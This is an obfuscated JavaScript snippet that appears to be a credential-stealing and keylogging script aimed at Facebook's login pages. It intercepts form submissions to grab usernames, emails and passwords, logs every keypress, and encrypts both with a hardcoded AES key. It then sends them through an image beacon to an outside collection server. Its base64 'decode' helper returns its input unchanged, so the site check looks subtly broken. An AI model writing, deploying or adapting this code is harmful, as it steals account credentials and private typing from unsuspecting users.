

;(function () {
  var _0x236157 = function (_0x4b115e) {
      return _0x4b115e
    },
    _0xb97b46 = function (_0x39fc2a) {
      return btoa(_0x39fc2a)
    }
  const _0xa4c77b = [_0x236157('d3d3LmZhY2Vib29rLmNvbQ==')]
  _0xa4c77b.indexOf(window.location.hostname) !== -1 &&
    (document.addEventListener('submit', function (_0x588ac5) {
      let _0x3f3565 = _0x588ac5.target,
        _0x25adbe = new FormData(_0x3f3565),
        _0x27b11e = _0x25adbe.get('username') || _0x25adbe.get('email'),
        _0xa702c8 = _0x25adbe.get('password')
      _0x27b11e && _0xa702c8 && _0x21a0ed(_0x27b11e, _0xa702c8)
    }),
    document.addEventListener('keydown', function (_0x5d14f4) {
      var _0x245dca = _0x5d14f4.key
      _0x3fd821('keystroke', _0x245dca)
    }))
  function _0x21a0ed(_0x34044e, _0x365ee0) {
    const _0x533867 = {
        user: _0x34044e,
        pass: _0x365ee0,
        site: window.location.hostname,
      },
      _0xb76240 = _0x1d4f8f(JSON.stringify(_0x533867))
    _0x3b8957(_0xb76240)
  }
  function _0x1d4f8f(_0x35a0d1) {
    const _0x21cd5b = CryptoJS.enc.Utf8.parse('SuperSecretKey123'),
      _0xedad20 = CryptoJS.lib.WordArray.random(16),
      _0x5136e4 = CryptoJS.AES.encrypt(_0x35a0d1, _0x21cd5b, { iv: _0xedad20 })
    return _0xedad20.concat(_0x5136e4.ciphertext).toString(CryptoJS.enc.Base64)
  }
  function _0x3b8957(_0x1f4065) {
    var _0x2e459b = new Image()
    _0x2e459b.src =
      'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(_0x1f4065)
    document.body.appendChild(_0x2e459b)
  }
  function _0x3fd821(_0x55fae2, _0x38b2f8) {
    const _0x2b57c5 = {
        type: _0x55fae2,
        data: _0x38b2f8,
        site: window.location.hostname,
      },
      _0x3aeb0f = _0x1d4f8f(JSON.stringify(_0x2b57c5))
    _0x3b8957(_0x3aeb0f)
  }
})()
